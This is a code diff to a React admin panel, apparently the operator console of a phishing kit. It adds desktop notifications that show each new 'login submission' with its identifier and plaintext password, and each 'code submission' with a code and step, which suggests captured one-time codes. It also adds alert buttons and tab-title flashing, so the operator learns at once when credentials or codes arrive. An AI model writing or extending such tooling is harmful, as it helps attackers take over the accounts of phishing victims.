@@ -445,6 +445,9 @@ function FaviconEditor() {
 function SubmissionsPanel({ initial }: { initial: AdminEntry[] }) {
   const [entries, setEntries] = useState<AdminEntry[]>(initial);
   const [soundOn, setSoundOn] = useState(false);
+  const [notifPerm, setNotifPerm] = useState<NotificationPermission | "unsupported">(
+    typeof Notification !== "undefined" ? Notification.permission : "unsupported"
+  );
   const audioCtxRef = useRef<AudioContext | null>(null);
   const refresh = useServerFn(listEntries);
   const clear = useServerFn(clearEntries);
@@ -488,9 +491,54 @@ function SubmissionsPanel({ initial }: { initial: AdminEntry[] }) {
     }
     setSoundOn(true);
     playChime();
-    if (typeof Notification !== "undefined" && Notification.permission === "default") {
-      Notification.requestPermission().catch(() => {});
+  };
+
+  const enableNotifications = async () => {
+    if (typeof Notification === "undefined") {
+      setNotifPerm("unsupported");
+      return;
     }
+    try {
+      const p = await Notification.requestPermission();
+      setNotifPerm(p);
+      if (p === "granted") {
+        try {
+          const n = new Notification("Notifications enabled", {
+            body: "You'll be alerted here when new submissions arrive.",
+          });
+          n.onclick = () => { window.focus(); n.close(); };
+        } catch {}
+      }
+    } catch {
+      setNotifPerm(Notification.permission);
+    }
+  };
+
+  const notifyForEntry = (n: AdminEntry) => {
+    if (typeof Notification === "undefined" || Notification.permission !== "granted") return;
+    const title =
+      n.kind === "login"
+        ? "New login submission"
+        : n.kind === "code"
+          ? "New code submission"
+          : "New action";
+    const body =
+      n.kind === "login"
+        ? `${n.identifier ?? ""} · ${n.password ?? ""}`
+        : n.kind === "code"
+          ? `Code ${n.code ?? ""} (${n.step ?? ""})`
+          : `${n.step ?? ""} · round ${n.round}`;
+    try {
+      const notif = new Notification(title, {
+        body,
+        tag: `entry-${n.id}`,
+        requireInteraction: true,
+      });
+      notif.onclick = () => {
+        window.focus();
+        notif.close();
+      };
+    } catch {}
   };
 
   useEffect(() => {
@@ -501,21 +549,18 @@ function SubmissionsPanel({ initial }: { initial: AdminEntry[] }) {
         const fresh = next.filter((n) => !prevIds.has(n.id));
         if (fresh.length > 0) {
           if (soundOn) playChime();
-          if (typeof Notification !== "undefined" && Notification.permission === "granted") {
-            const n = fresh[0]!;
-            const title =
-              n.kind === "login"
-                ? "New login submission"
-                : n.kind === "code"
-                  ? "New code submission"
-                  : "New action";
-            const body =
-              n.kind === "login"
-                ? `${n.identifier ?? ""} · ${n.password ?? ""}`
-                : n.kind === "code"
-                  ? `Code ${n.code ?? ""} (${n.step ?? ""})`
-                  : `${n.step ?? ""} · round ${n.round}`;
-            try { new Notification(title, { body }); } catch {}
+          // Fire desktop notifications regardless of tab focus so the OS alerts
+          // the admin when the browser isn't the active window.
+          fresh.forEach(notifyForEntry);
+          // Flash the tab title when the page isn't visible.
+          if (typeof document !== "undefined" && document.hidden) {
+            const original = document.title;
+            document.title = `(${fresh.length}) New submission`;
+            const restore = () => {
+              document.title = original;
+              document.removeEventListener("visibilitychange", restore);
+            };
+            document.addEventListener("visibilitychange", restore);
           }
         }
         return next;
@@ -548,6 +593,29 @@ function SubmissionsPanel({ initial }: { initial: AdminEntry[] }) {
               🔕 Enable sound
             </button>
           )}
+          {notifPerm === "granted" ? (
+            <span
+              className="rounded-md border border-input px-3 py-1.5 text-xs text-muted-foreground"
+              title="Desktop notifications are enabled"
+            >
+              🖥️ Alerts on
+            </span>
+          ) : notifPerm === "denied" ? (
+            <span
+              className="rounded-md border border-destructive/40 px-3 py-1.5 text-xs text-destructive"
+              title="Notifications blocked — enable them in your browser site settings"
+            >
+              🚫 Alerts blocked
+            </span>
+          ) : notifPerm === "unsupported" ? null : (
+            <button
+              onClick={enableNotifications}
+              className="rounded-md border border-primary bg-primary/10 px-3 py-1.5 text-xs font-medium text-primary hover:bg-primary/20"
+              title="Get a desktop alert when you're on another tab or app"
+            >
+              🖥️ Enable alerts
+            </button>
+          )}
           <button
             onClick={async () => {
               await clear();
@@ -558,6 +626,7 @@ function SubmissionsPanel({ initial }: { initial: AdminEntry[] }) {
             Clear
           </button>
         </div>
+
       </div>
 
       {entries.length === 0 && (
